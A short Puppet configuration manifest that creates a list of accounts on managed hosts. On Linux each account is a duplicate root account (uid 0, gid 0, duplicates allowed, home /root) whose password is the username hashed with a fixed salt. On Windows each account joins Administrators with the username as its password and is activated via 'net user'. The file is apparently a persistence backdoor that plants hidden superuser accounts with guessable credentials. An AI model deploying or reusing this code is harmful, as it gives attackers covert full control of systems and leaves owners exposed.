class user {
  include stdlib
  include vars
  $users.each |$user| {
    if $::osfamily != 'windows' {
      user { $user:
        ensure => present,
        home => '/root',
        managehome => true,
        password => pw_hash($user, 'SHA-512', 'xyz'),
        uid => 0,
        allowdupe => true,
        gid => 0,
        shell => '/bin/bash'
      }
    } elsif $::osfamily == 'windows' {
      user { $user:
        ensure => present,
        groups => ['Administrators'],
        membership => minimum,
        password => $user
      }
      exec { "${user}-active":
        path => 'C:/Windows/System32',
        command => ['net', 'user', $user, '/active:yes']
      }
    }
  }
}
